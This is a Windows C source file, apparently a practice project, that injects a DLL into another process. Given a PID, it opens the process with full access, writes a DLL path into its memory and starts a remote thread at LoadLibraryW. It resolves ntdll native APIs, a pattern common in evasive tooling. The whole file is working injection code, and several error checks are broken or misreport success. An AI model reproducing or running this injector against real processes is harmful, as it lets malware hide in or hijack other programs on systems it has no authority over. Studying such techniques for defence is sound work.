#include<Windows.h>
#include<glassBox.h>
#include<important.h>


int main(int argc, char** argv) {

	DWORD PID = NULL, TID = NULL;
	HANDLE hProcess = NULL, hThread = NULL;
	PVOID rbuffer = NULL;
	HMODULE hKERNEL32 = NULL;
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	SIZE_T size = NULL;
	NTSTATUS status = NULL;
	HMODULE hNTDLL;
	LPTHREAD_START_ROUTINE startThis = NULL;

	wchar_t dllPath[MAX_PATH] = L"C:\\Users\\dell\\Desktop\\codeinJava\\javascript&typescript\\dll_injection\\x64_dll\\pookie.dll";
	SIZE_T dllPathSize = sizeof(dllPath);
	if (argc < 2) {
		warn("pass the pid of the process too!");
		return EXIT_FAILURE;
	}
	HANDLE hParent = GetCurrentProcess();
	hNTDLL = GetMod(L"NTDLL");
	NtCreateProcess createProcess = (NtCreateProcess)GetProcAddress(hNTDLL, "NtCreateProcess");
	NtOpenProcess openProcess = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
	NtCreateThreadEx Thread = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
	NtAllocateVirtualMemory malloc = (NtAllocateVirtualMemory)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
	NtWriteVirtualMemory writeMem = (NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
	NtWaitForSingleObject executeThread = (NtWaitForSingleObject)GetProcAddress(hNTDLL, "NtWaitForSingleObject");
	NtClose close = (NtClose)GetProcAddress(hNTDLL, "NtClose");
	okay("finished , creating process!\n");
	PID = atoi(argv[1]);
	OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
	CLIENT_ID CID = { (HANDLE)PID,NULL };
	// open a process or create a process
	status = openProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
	if (status) {
		warn("process opened/created succesfully!\n, error code : %ld\n", status);
		goto cleanup;
	}

	//okay("process opened (%d) \n",PID);
	info("new build!");
	info("process handle here 0x%p\n", hProcess);
	// allocate memory to process
	info("asking to allcote virtual memory of %d", dllPathSize);
	status = malloc(hProcess, &rbuffer, 0, &dllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (status) {
		warn("Failed to allocate memory of %d\n, error code: %ld\n", dllPathSize, status);
		goto cleanup;
	}

	// write the shellcode to the memory 
	info("the address to buffer: 0x%p ", rbuffer);
	//status = writeMem(hProcess, rbuffer, BUFFER,size_shlcd,&size);
	WriteProcessMemory(hProcess, rbuffer, dllPath, dllPathSize, &size);
	if (status) {
		warn("Failed to write into memory of size: %d\n, error code: %ld\n", dllPathSize, status);
		goto cleanup;
	}
	info("succesfully written into the memory at 0x%p of size %d\n", rbuffer, size);
	info("getting handle to the KERNEL32");
	hKERNEL32 = GetModuleHandleW(L"Kernel32");
	if (hKERNEL32 == NULL) {
		warn("failed to get a handle to Kernel32.dll, error : %ld\n", GetLastError());
		goto cleanup;
	}
	okay("got a handle to Kernel32.dll ------0x%p\n", hKERNEL32);
	startThis = (LPTHREAD_START_ROUTINE)GetProcAddress(hKERNEL32, "LoadLibraryW");

	if (startThis == NULL) {
		warn("cannot get to the LoadLibraryW module %ld", GetLastError());
		goto cleanup;
	}
	info("[$] got the address of LoadLibraryW() =====0x%p\n", startThis);
	// allocate a thread to the memory 
	//status = Thread(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)rbuffer, NULL, FALSE, 0, 0, 0, NULL);
	//status = Thread(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)startThis, dllPath, FALSE, 0, 0, 0, NULL);
	hThread = CreateRemoteThread(hProcess, NULL, 0, startThis, rbuffer, 0, &TID);
	if (status) {
		warn("Failed to create a Remote Thread, error code: %ld\n", status);
		goto cleanup;
	}
	info("waiting for the thread to execute");
	//status = executeThread(hThread, FALSE, NULL);
	info("running with winapi");
	WaitForSingleObject(hThread, INFINITE);
	if (status) {
		warn("Failed to execute the thread, error code: %ld\n", status);
		goto cleanup;
	}
	okay("execute the thread successfully , now exiting this goodbye\n");
	// close the thread and handle of the process
	goto success;

cleanup:
	// exit quitly!
	if (hThread) {
		close(hThread);
	}
	if (hProcess) {
		close(hProcess);
	}
	return EXIT_FAILURE;

success:
	// exit quitly!
	if (hThread) {
		close(hThread);
	}
	if (hProcess) {
		close(hProcess);
	}
	return EXIT_SUCCESS;


}